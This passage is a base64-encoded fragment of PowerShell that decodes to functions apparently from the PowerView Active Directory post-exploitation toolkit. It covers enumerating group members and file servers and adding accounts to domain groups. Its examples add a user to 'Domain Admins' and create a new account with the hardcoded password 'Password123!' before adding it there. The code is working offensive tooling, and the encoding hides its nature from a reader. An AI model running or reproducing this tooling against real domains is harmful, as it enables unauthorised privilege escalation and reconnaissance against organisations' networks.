uZCAkVXNlTWF0Y2hpbmdSdWxlKSB7CiAgICAgICAgICAgICAgICAgICAgJFByb3BlcnRpZXMgPSAkXy5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0U2VhcmNoZXJBcmd1bWVudHMgPSAkU2VhcmNoZXJBcmd1bWVudHMuQ2xvbmUoKQogICAgICAgICAgICAgICAgICAgICRPYmplY3RTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRNZW1iZXIKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0U2VhcmNoZXJBcmd1bWVudHNbJ1JhdyddID0gJFRydWUKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0U2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICdkaXN0aW5ndWlzaGVkbmFtZSxjbixzYW1hY2NvdW50bmFtZSxvYmplY3RzaWQsb2JqZWN0Y2xhc3MnCiAgICAgICAgICAgICAgICAgICAgJE9iamVjdCA9IEdldC1Eb21haW5PYmplY3QgQE9iamVjdFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgJFByb3BlcnRpZXMgPSAkT2JqZWN0LlByb3BlcnRpZXMKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZiAoJFByb3BlcnRpZXMpIHsKICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXIgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwRG9tYWluJyAkR3JvdXBGb3VuZERvbWFpbgogICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE5hbWUnICRHcm91cEZvdW5kTmFtZQogICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cERpc3Rpbmd1aXNoZWROYW1lJyAkR3JvdXBGb3VuZEROCgogICAgICAgICAgICAgICAgICAgIGlmICgkUHJvcGVydGllcy5vYmplY3RzaWQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlclNJRCA9ICgoTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllciAkUHJvcGVydGllcy5vYmplY3RzaWRbMF0sIDApLlZhbHVlKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlclNJRCA9ICROdWxsCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyRE4gPSAkUHJvcGVydGllcy5kaXN0aW5ndWlzaGVkbmFtZVswXQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE1lbWJlckROIC1tYXRjaCAnRm9yZWlnblNlY3VyaXR5UHJpbmNpcGFsc3xTLTEtNS0yMScpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKC1ub3QgJE1lbWJlclNJRCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyU0lEID0gJFByb3BlcnRpZXMuY25bMF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlclNpbXBsZU5hbWUgPSBDb252ZXJ0LUFETmFtZSAtSWRlbnRpdHkgJE1lbWJlclNJRCAtT3V0cHV0VHlwZSAnRG9tYWluU2ltcGxlJyBAQUROYW1lQXJndW1lbnRzCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkTWVtYmVyU2ltcGxlTmFtZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyRG9tYWluID0gJE1lbWJlclNpbXBsZU5hbWUuU3BsaXQoJ0AnKVsxXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3IgY29udmVydGluZyAkTWVtYmVyRE4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJEb21haW4gPSAkTnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LURvbWFpbkdyb3VwTWVtYmVyXSBFcnJvciBjb252ZXJ0aW5nICRNZW1iZXJETiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyRG9tYWluID0gJE51bGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgZXh0cmFjdCB0aGUgRlFETiBmcm9tIHRoZSBEaXN0aW5ndWlzaGVkIE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJEb21haW4gPSAkTWVtYmVyRE4uU3ViU3RyaW5nKCRNZW1iZXJETi5JbmRleE9mKCdEQz0nKSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlckROID0gJE51bGwKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlckRvbWFpbiA9ICROdWxsCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBpZiAoJFByb3BlcnRpZXMuc2FtYWNjb3VudG5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBmb3Jlc3QgdXNlcnMgaGF2ZSB0aGUgc2FtQWNjb3VudE5hbWUgc2V0CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJOYW1lID0gJFByb3BlcnRpZXMuc2FtYWNjb3VudG5hbWVbMF0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgZXh0ZXJuYWwgdHJ1c3QgdXNlcnMgaGF2ZSBhIFNJRCwgc28gY29udmVydCBpdAogICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlck5hbWUgPSBDb252ZXJ0RnJvbS1TSUQgLU9iamVjdFNJRCAkUHJvcGVydGllcy5jblswXSBAQUROYW1lQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBpZiB0aGVyZSdzIGEgcHJvYmxlbSBjb250YWN0aW5nIHRoZSBkb21haW4gdG8gcmVzb2x2ZSB0aGUgU0lECiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyTmFtZSA9ICRQcm9wZXJ0aWVzLmNuWzBdCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGlmICgkUHJvcGVydGllcy5vYmplY3RjbGFzcyAtbWF0Y2ggJ2NvbXB1dGVyJykgewogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyT2JqZWN0Q2xhc3MgPSAnY29tcHV0ZXInCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2VpZiAoJFByb3BlcnRpZXMub2JqZWN0Y2xhc3MgLW1hdGNoICdncm91cCcpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlck9iamVjdENsYXNzID0gJ2dyb3VwJwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRQcm9wZXJ0aWVzLm9iamVjdGNsYXNzIC1tYXRjaCAndXNlcicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlck9iamVjdENsYXNzID0gJ3VzZXInCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyT2JqZWN0Q2xhc3MgPSAkTnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWVtYmVyRG9tYWluJyAkTWVtYmVyRG9tYWluCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ01lbWJlck5hbWUnICRNZW1iZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ01lbWJlckRpc3Rpbmd1aXNoZWROYW1lJyAkTWVtYmVyRE4KICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWVtYmVyT2JqZWN0Q2xhc3MnICRNZW1iZXJPYmplY3RDbGFzcwogICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNZW1iZXJTSUQnICRNZW1iZXJTSUQKICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXIuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3Lkdyb3VwTWVtYmVyJykKICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXIKCiAgICAgICAgICAgICAgICAgICAgIyBpZiB3ZSdyZSBkb2luZyBtYW51YWwgcmVjdXJzaW9uCiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVjdXJzZSddIC1hbmQgJE1lbWJlckROIC1hbmQgKCRNZW1iZXJPYmplY3RDbGFzcyAtbWF0Y2ggJ2dyb3VwJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Hcm91cE1lbWJlcl0gTWFudWFsbHkgcmVjdXJzaW5nIG9uIGdyb3VwOiAkTWVtYmVyRE4iCiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRNZW1iZXJETgogICAgICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICRTZWFyY2hlckFyZ3VtZW50cy5SZW1vdmUoJ1Byb3BlcnRpZXMnKQogICAgICAgICAgICAgICAgICAgICAgICBHZXQtRG9tYWluR3JvdXBNZW1iZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRHcm91cFNlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEFkZC1Eb21haW5Hcm91cE1lbWJlciB7CjwjCi5TWU5PUFNJUwoKQWRkcyBhIGRvbWFpbiB1c2VyIChvciBncm91cCkgdG8gYW4gZXhpc3RpbmcgZG9tYWluIGdyb3VwLCBhc3N1bWluZwphcHByb3ByaWF0ZSBwZXJtaXNzaW9ucyB0byBkbyBzby4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LVByaW5jaXBhbENvbnRleHQgIAoKLkRFU0NSSVBUSU9OCgpGaXJzdCBiaW5kcyB0byB0aGUgc3BlY2lmaWVkIGRvbWFpbiBjb250ZXh0IHVzaW5nIEdldC1QcmluY2lwYWxDb250ZXh0LgpUaGUgYm91bmQgZG9tYWluIGNvbnRleHQgaXMgdGhlbiB1c2VkIHRvIHNlYXJjaCBmb3IgdGhlIHNwZWNpZmllZCAtR3JvdXBJZGVudGl0eSwKd2hpY2ggcmV0dXJucyBhIERpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50Lkdyb3VwUHJpbmNpcGFsIG9iamVjdC4gRm9yCmVhY2ggZW50cnkgaW4gLU1lbWJlcnMsIGVhY2ggbWVtYmVyIGlkZW50aXR5IGlzIHNpbWlsYXJseSBzZWFyY2hlZCBmb3IgYW5kIGFkZGVkCnRvIHRoZSBncm91cC4KCi5QQVJBTUVURVIgSWRlbnRpdHkKCkEgZ3JvdXAgU2FtQWNjb3VudE5hbWUgKGUuZy4gR3JvdXAxKSwgRGlzdGluZ3Vpc2hlZE5hbWUgKGUuZy4gQ049Z3JvdXAxLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwpLApTSUQgKGUuZy4gUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTE0KSwgb3IgR1VJRCAoZS5nLiA0YzQzNWRkNy1kYzU4LTRiMTQtOWE1ZS0xZmRiMGU4MGQyMDIpCnNwZWNpZnlpbmcgdGhlIGdyb3VwIHRvIGFkZCBtZW1iZXJzIHRvLgoKLlBBUkFNRVRFUiBNZW1iZXJzCgpPbmUgb3IgbW9yZSBtZW1iZXIgaWRlbnRpdGllcywgaS5lLiBTYW1BY2NvdW50TmFtZSAoZS5nLiBHcm91cDEpLCBEaXN0aW5ndWlzaGVkTmFtZQooZS5nLiBDTj1ncm91cDEsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksIFNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMTQpLApvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMikuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIHRvIHNlYXJjaCBmb3IgdXNlci9ncm91cCBwcmluY2lwYWxzLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKQWRkLURvbWFpbkdyb3VwTWVtYmVyIC1JZGVudGl0eSAnRG9tYWluIEFkbWlucycgLU1lbWJlcnMgJ2hhcm1qMHknCgpBZGRzIGhhcm1qMHkgdG8gJ0RvbWFpbiBBZG1pbnMnIGluIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpBZGQtRG9tYWluR3JvdXBNZW1iZXIgLUlkZW50aXR5ICdEb21haW4gQWRtaW5zJyAtTWVtYmVycyAnaGFybWoweScgLUNyZWRlbnRpYWwgJENyZWQKCkFkZHMgaGFybWoweSB0byAnRG9tYWluIEFkbWlucycgaW4gdGhlIGN1cnJlbnQgZG9tYWluIHVzaW5nIHRoZSBhbHRlcm5hdGUgY3JlZGVudGlhbHMuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKJFVzZXJQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQpOZXctRG9tYWluVXNlciAtU2FtQWNjb3VudE5hbWUgYW5keSAtQWNjb3VudFBhc3N3b3JkICRVc2VyUGFzc3dvcmQgLUNyZWRlbnRpYWwgJENyZWQgfCBBZGQtRG9tYWluR3JvdXBNZW1iZXIgJ0RvbWFpbiBBZG1pbnMnIC1DcmVkZW50aWFsICRDcmVkCgpDcmVhdGVzIHRoZSAnYW5keScgdXNlciB3aXRoIHRoZSBzcGVjaWZpZWQgZGVzY3JpcHRpb24gYW5kIHBhc3N3b3JkLCB1c2luZyB0aGUgc3BlY2lmaWVkCmFsdGVybmF0ZSBjcmVkZW50aWFscywgYW5kIGFkZHMgdGhlIHVzZXIgdG8gJ2RvbWFpbiBhZG1pbnMnIHVzaW5nIEFkZC1Eb21haW5Hcm91cE1lbWJlcgphbmQgdGhlIGFsdGVybmF0ZSBjcmVkZW50aWFscy4KCi5MSU5LCgpodHRwOi8vcmljaGFyZHNwb3dlcnNoZWxsYmxvZy53b3JkcHJlc3MuY29tLzIwMDgvMDUvMjUvc3lzdGVtLWRpcmVjdG9yeXNlcnZpY2VzLWFjY291bnRtYW5hZ2VtZW50LwojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0dyb3VwTmFtZScsICdHcm91cElkZW50aXR5JyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkSWRlbnRpdHksCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdNZW1iZXJJZGVudGl0eScsICdNZW1iZXInLCAnRGlzdGluZ3Vpc2hlZE5hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJE1lbWJlcnMsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJENvbnRleHRBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnSWRlbnRpdHknID0gJElkZW50aXR5CiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb250ZXh0QXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQ29udGV4dEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAkR3JvdXBDb250ZXh0ID0gR2V0LVByaW5jaXBhbENvbnRleHQgQENvbnRleHRBcmd1bWVudHMKCiAgICAgICAgaWYgKCRHcm91cENvbnRleHQpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRHcm91cCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuR3JvdXBQcmluY2lwYWxdOjpGaW5kQnlJZGVudGl0eSgkR3JvdXBDb250ZXh0LkNvbnRleHQsICRHcm91cENvbnRleHQuSWRlbnRpdHkpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0FkZC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3IgZmluZGluZyB0aGUgZ3JvdXAgaWRlbnRpdHkgJyRJZGVudGl0eScgOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJEdyb3VwKSB7CiAgICAgICAgICAgIEZvckVhY2ggKCRNZW1iZXIgaW4gJE1lbWJlcnMpIHsKICAgICAgICAgICAgICAgIGlmICgkTWVtYmVyIC1tYXRjaCAnLitcXC4rJykgewogICAgICAgICAgICAgICAgICAgICRDb250ZXh0QXJndW1lbnRzWydJZGVudGl0eSddID0gJE1lbWJlcgogICAgICAgICAgICAgICAgICAgICRVc2VyQ29udGV4dCA9IEdldC1QcmluY2lwYWxDb250ZXh0IEBDb250ZXh0QXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgaWYgKCRVc2VyQ29udGV4dCkgewogICAgICAgICAgICAgICAgICAgICAgICAkVXNlcklkZW50aXR5ID0gJFVzZXJDb250ZXh0LklkZW50aXR5CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJFVzZXJDb250ZXh0ID0gJEdyb3VwQ29udGV4dAogICAgICAgICAgICAgICAgICAgICRVc2VySWRlbnRpdHkgPSAkTWVtYmVyCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbQWRkLURvbWFpbkdyb3VwTWVtYmVyXSBBZGRpbmcgbWVtYmVyICckTWVtYmVyJyB0byBncm91cCAnJElkZW50aXR5JyIKICAgICAgICAgICAgICAgICRNZW1iZXIgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlByaW5jaXBhbF06OkZpbmRCeUlkZW50aXR5KCRVc2VyQ29udGV4dC5Db250ZXh0LCAkVXNlcklkZW50aXR5KQogICAgICAgICAgICAgICAgJEdyb3VwLk1lbWJlcnMuQWRkKCRNZW1iZXIpCiAgICAgICAgICAgICAgICAkR3JvdXAuU2F2ZSgpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRG9tYWluRmlsZVNlcnZlciB7CjwjCi5TWU5PUFNJUwoKUmV0dXJucyBhIGxpc3Qgb2Ygc2VydmVycyBsaWtlbHkgZnVuY3Rpb25pbmcgYXMgZmlsZSBzZXJ2ZXJzLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluU2VhcmNoZXIgIAoKLkRFU0NSSVBUSU9OCgpSZXR1cm5zIGEgbGlzdCBvZiBsaWtlbHkgZmlsZXNlcnZlcnMgYnkgc2VhcmNoaW5nIGZvciBhbGwgdXNlcnMgaW4gQWN0aXZlIERpcmVjdG9yeQp3aXRoIG5vbi1udWxsIGhvbWVkaXJlY3RvcnksIHNjcmlwdHBhdGgsIG9yIHByb2ZpbGVwYXRoIGZpZWxkcywgYW5kIGV4dHJhY3RpbmcvdW5pcXVpZnlpbmcKdGhlIHNlcnZlciBuYW1lcy4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5GaWxlU2VydmVyCgpSZXR1cm5zIGFjdGl2ZSBmaWxlIHNlcnZlcnMgZm9yIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluRmlsZVNlcnZlciAtRG9tYWluIHRlc3RpbmcubG9jYWwKClJldHVybnMgYWN0aXZlIGZpbGUgc2VydmVycyBmb3IgdGhlICd0ZXN0aW5nLmxvY2FsJyBkb21haW4uCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LURvbWFpbkZpbGVTZXJ2ZXIgLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpTdHJpbmcKCk9uZSBvciBtb3JlIHN0cmluZ3MgcmVwcmVzZW50aW5nIGZpbGUgc2VydmVyIG5hbWVzLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZShbU3RyaW5nXSldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlciggVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluTmFtZScsICdOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAg